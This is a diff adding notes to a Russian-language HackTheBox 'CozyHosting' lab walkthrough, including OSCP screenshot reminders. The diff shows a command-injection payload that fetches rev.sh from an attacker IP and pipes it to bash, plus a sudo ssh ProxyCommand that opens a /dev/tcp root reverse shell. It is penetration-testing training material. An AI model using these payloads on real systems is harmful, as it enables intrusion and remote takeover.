@@ -74,6 +74,8 @@ echo "10.129.229.88    cozyhosting.htb" | sudo tee -a /etc/hosts
 
 ## Первичный Доступ
 
+No CVE (custom vulnerability) - Spring Boot Actuator `/actuator/sessions` returns session IDs without authentication; the leaked admin session grants access to the panel, where the hostname field is vulnerable to OS command injection.
+
 ```bash
 gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 ```
@@ -128,6 +130,9 @@ Payload:
 test;curl${IFS}http://10.10.14.177:7000/rev.sh|bash;
 ```
 
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
+
 Shell от `app`.
 
 ```bash
@@ -178,6 +183,9 @@ cat user.txt
 # <USER_FLAG>
 ```
 
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
+
 ---
 
 ## Повышение Привилегий
@@ -192,6 +200,9 @@ sudo -l
 nc -lvnp 5555
 sudo ssh -o ProxyCommand=';bash -c "bash -i >& /dev/tcp/10.10.14.177/5555 0>&1"' x
 ```
+
+> [!IMPORTANT]
+> OSCP report: take a screenshot of this step (command + output + timestamp).
 
 `ssh` выполняет `ProxyCommand` до реального SSH-соединения - с правами root.
 
